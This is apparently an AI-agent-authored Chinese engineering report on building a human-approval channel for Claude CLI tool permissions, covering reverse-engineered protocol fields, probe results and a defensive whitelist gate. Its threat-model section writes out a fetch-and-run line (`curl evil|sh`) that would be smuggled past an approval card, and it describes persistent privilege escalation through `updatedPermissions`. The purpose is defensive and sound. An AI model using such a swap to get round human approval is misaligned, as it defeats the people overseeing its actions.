<!-- 514cc-session-id: cf8dac53-77b0-4ebe-891a-d261f66f8439 -->

# v50 Claude CLI 许可通道 · 取证阶段闭环

**日期**：2026-09-04
**范围**：`apps/control-center`（协议层 + 取证工具，**未接线到 UI**）
**起因**：LO 截图报告 —— CLI 回了 `The following part requires approval: xargs wc -l`，Console 把它渲染成红色"工具错误"，人根本没被问到

---

## 一句话

**端到端第一次跑通并留证**：批准 → 文件真写出来；拒绝 → 文件未创建且原因原样送达模型。
此前主驾三次、烛一次实测均未跑通。

---

## 缺陷本质

| 层 | 事实 |
|---|---|
| CLI 契约 | `--permission-prompts` 默认 `"host"`，即"由 SDK 宿主或 `--permission-prompt-tool` 应答" |
| Console 现状 | **不是 host，没有应答端** —— `claude-cli.mjs:157` 走 `runProcess` 纯文本 stdin 一次性喂完 |
| 后果 | 许可请求无人应答 → 超时/自动否决 → 变成 `is_error` 的 tool_result |
| 前端 | `conversation-event-markup.js:103` 把它当普通「工具错误」红字渲染 |

与本程早些时候修的 `broadPermission` 正好是镜像：那个是「给了按钮但后端做不到」，这个是「后端要选择但没给按钮」。

---

## 三方协作实况

### 织（grok-researcher）：源码级取证，推翻主驾假设

**没有停在"官方零文档"上**（issue #24595 提出后被 stale 机器人关闭、锁定，未修复）。
本机 `claude.exe` v2.1.260 是 Bun 单文件打包、JS 源码明文驻留，织用固定串定位偏移 + `dd` 切片挖出实现：

- 入参构造点 ~202939342：`te=e.call({tool_name:d.name,input:X,tool_use_id:D},...)`
- 响应 schema ~202454550：`fe`(allow) / `ge`(deny) / `Uhe`=union

**推翻的假设**：主驾原以为可能是 `{toolName, toolInput}`。实为全 snake_case。照猜的写会做出一个死的实现。

**挖出 4 个官方文档完全没有的字段**，其中两个决定了设计：
- `toolUseID`（响应侧）vs `tool_use_id`（请求侧）—— 大小写反转，optional，**写错不报错、静默丢弃**
- schema 校验失败 → **静默 deny**，只写一行 error 日志

第二条直接决定了 `permission-prompt-wire.mjs` 必须自带出参校验：不能指望 CLI 告诉你错了。

织**如实声明本轮 grok-4.5 API 未调用**（证据全部来自 web 检索 + 本机二进制），不伪装成模型产出。

### 烛（codex-reviewer）：否掉主驾方向，照出更重的洞

主驾一路警惕的是**入站**伪造（本程早些时候栽过的面）。烛指出更重的洞在**回程**，三条硬证据主驾逐条核实为真：

| 烛的指控 | 主驾核实 |
|---|---|
| `actionHash` 只 hash 入站 `{method,params}`，回程零覆盖 | `approval-broker.mjs:29-31` 确认 |
| `CONTROL_CENTER_TOKEN` 被测试锁死排除在子进程 env 外 | `tests/adapters.test.mjs:1218` 确认 |
| `codex-app-server` 自持 `spawnImpl` 绕开 `runProcess` | `:470,492,546,603` 确认 |

**攻击路径**：审批卡显示 `npm test`、操作者点批准，回程写 `{updatedInput:{command:"curl evil|sh"}}` → CLI 执行后者，而账本记的是 `npm test` 的哈希。

烛的定性很准：*上次那条是"账本说拒绝、线上放行"；这条是"账本说批准 A、线上执行 B"。*

更远一步：`updatedPermissions` 配 `destination:"userSettings"` 是**持久化提权**，与 `approval-methods.mjs` 已守住的"v1 不通过审批扩大权限面"红线正面冲突。

**主驾的一次误读**：挖到 `mHt` 里 `updatedPermissions` 真会写盘（`dM(f, o.storageV5)`）时，主驾一度把它读成"能力发现"而兴奋。同一个事实，烛读出的是危险面。

---

## 主驾的独立取证（补上两方都没跑通的那块）

烛推荐 stream-json 方案时如实标注"帧格式未在本机实证"。主驾没有照着未验证的形状动 adapter，而是先做取证。

### 新增 `scripts/probe-permission-frames.mjs`

起最小 stdio MCP server 当 PPT 目标，把每一帧原样落盘，按指定决策应答，记录 CLI 后续行为。

**诚实判读是它的核心**：区分 `EVIDENCE_CAPTURED` / `INCONCLUSIVE`（API 故障、未握手、未触发工具）/ `TOOL_RAN_WITHOUT_PROMPT`。
实跑中它两次正确报出 INCONCLUSIVE 而非伪造结果。

### 实测结论（本机 CLI 2.1.260，可复跑）

| 发现 | 证据 |
|---|---|
| **批准生效** | `probe-target.txt` 真被创建，内容 `hello` |
| **拒绝生效** | 文件未创建，且 `message` 原样送达模型（tool_result `isError=true`，内容 `"probe deny (evidence run)"`） |
| **`manual` 档被静默降级成 `default`** | 探针机械记录 `permissionMode: {requested:"manual", effective:"default"}`，PPT 不触发 |
| **`plan` 档可靠触发** | 两次成功取证均为 plan |
| **`_meta["claudecode/toolUseId"]`** | 二进制取证时未见，是实测净增量；与 `arguments.tool_use_id` 一致 |
| **`ExitPlanMode` 也走许可通道** | plan 档下第一个弹的是"是否同意执行计划"，UI 设计要考虑 |

`--allowedTools` / settings.json 的 allow 规则命中的请求在更早阶段就被解决，**根本到不了 PPT** —— 主驾前两次探测失败正是撞在这里。

---

## 交付

| 文件 | 内容 | 测试 |
|---|---|---|
| `src/permission-prompt-wire.mjs` | PPT 线协议单一真相源 + v1 安全闸 | 35 |
| `tests/fixtures/permission-prompt-frames.json` | 真实取证的结构指纹（非构造样本） | — |
| `tests/permission-prompt-frames.test.mjs` | 基于真实帧的回归 | 9 |
| `scripts/probe-permission-frames.mjs` | 可复跑取证工具 | — |

**v1 安全闸**（烛评审的机械承载，不是注释）：

```
协议全集    allow: behavior/updatedInput/updatedPermissions/toolUseID/decisionClassification
v1 白名单   allow: behavior/toolUseID/decisionClassification          ← 严格更窄
v1 禁用     updatedInput / updatedPermissions / interrupt            ← 各带禁用理由
```

两张表**刻意分开**：`WIRE_RESPONSE_FIELDS` 记录协议事实，`V1_ALLOWED_RESPONSE_FIELDS` 是本控制面的许可范围。将来放宽 v1 时不会连协议记录一起改坏。

`toolResultFor` 是唯一出口且走 v1 闸 —— 手搓 payload 绕不过去（有专门测试）。

### 元验收（两轮真注入）

| 注入 | 结果 |
|---|---|
| 协议突变（`allow`→`approve`、`toolUseID`→`tool_use_id`） | 8 项变红 |
| 掏空 v1 闸（模拟"白名单常量存在但没人消费"） | 5 项攻击面测试变红 |

两轮均还原后全绿，并核对突变清零、有效修复保留。

测试还**当场抓到主驾一个真错**：`typeof [] === "object"`，数组会被当参数对象透传进审批卡。改的是实现，不是测试。

---

## 关于"不只是批准/拒绝"（LO 提出）

主驾去二进制挖了 `decisionClassification` 的消费点，**填上了织标注的缺口 3**：

```js
// 官方 describe（偏移 102125141）：
"user_temporary for allow-once, user_permanent for always-allow
 (both the click and later cache hits), user_reject for deny... for telemetry"
// 消费点（偏移 187109966）：
case "user": return e.permanent ? "user_permanent" : "user_temporary";
// 且 toolDecisions 缓存被后续逻辑消费（偏移 198542878 的 pl() 函数）
```

**协议层确实支持三选一**，但关键在于：**"总是允许"的机械承载恰恰是 `updatedPermissions`，也就是烛刚否掉的那个持久化提权面**。

能表达"推荐选择"的字段，和能持久化提权的字段，是同一个 —— 这不是巧合。

**v1 的诚实边界**：`decisionClassification` 可如实上报（纯遥测归类），但它**不产生持久效果**。有专门测试锁死这点，防止 UI 将来据此向操作者承诺"以后不再问"。

真要做"总是允许"，应走控制面自己的规则存储（Console 记住"这个工具在这个项目下已批准"），下次同样请求由 Console 直接回 allow，**不碰 CLI 的权限存储**。已记入遗留。

---

## 未做（显式登记，不掩盖）

| 项 | 状态 | 说明 |
|---|---|---|
| **接线到 adapter / UI** | 未做 | `permission-prompt-wire.mjs` 目前**零消费者** —— 这正是主驾本程反复栽的"意图无机械承载"形态。取证已完成，接线是下一步，不在本次范围 |
| 通道选型 | 待定 | 烛推荐 stream-json（内核记账，归属天然正确）；stdio MCP 已实证可跑但**多 run 并发时归属无解**（`claude-cli.mjs:57` 每 turn spawn，MCP 是 CLI 的子进程，runId 只能靠沙箱自称） |
| 回程进哈希链 | 未做 | 烛的第二条硬约束。v1 因禁掉 `updatedInput`/`updatedPermissions`，回程只剩 `{behavior, message}`，风险已大幅收窄，但哈希覆盖仍是应做项 |
| "总是允许" | 未做 | 需 Console 侧规则存储，见上 |
| `conversations-http.test.mjs:200` | 先前债 | `'build' !== 'plan'`，本会话开始前即存在，未动 |

**最终状态**：2216 项测试 / 2213 通过 / 1 失败（先前债）/ 2 跳过。本轮新增 44 项。

---

## 元教训

**1. "官方无文档"不等于"查不到"。**
织没停在文档缺失上，转而对本机二进制取证 —— 拿到的规格比任何文档都准，因为它就是正在跑的那个版本。

**2. 同一个事实，可以被读成能力也可以被读成危险面。**
主驾挖到 `updatedPermissions` 真会写盘时读成"能力发现"，烛读出的是"持久化提权"。差别不在信息，在提问方式：主驾问"它能做什么"，烛问"它最坏能做什么"。

**3. 烛的部分理由不成立，不代表结论不成立。**
烛否 MCP 通道的第一条理由（IPC 无凭证）对 stdio MCP 并不适用 —— stdio 管道也是 spawn 时拿到的。但它的第二条理由（每 turn spawn 导致归属只能靠沙箱自称）独立地否掉了该方案。**核实每一条，而不是整体接受或整体反驳。**

**4. 先取证再动刀。**
烛原话："没测的那部分恰好会是致命项落点。" 本轮在动 adapter 前先做取证，结果发现了 `manual` 静默降级、`ExitPlanMode` 也走许可通道、`_meta` 副本三件事 —— 任何一件都会让照着规格写的实现出错。

---

__DELTA__: 主驾自评(Claude) | 1 | 证据：本机取证跑通烛与主驾此前均未跑通的端到端（.evidence/permission-frames/2026-09-04T11-01-12-147Z 与 T11-04-00-120Z），新增三条无人报告过的实测事实——manual 档静默降级为 default 致 PPT 不触发、ExitPlanMode 亦走许可通道、_meta["claudecode/toolUseId"] 副本通道
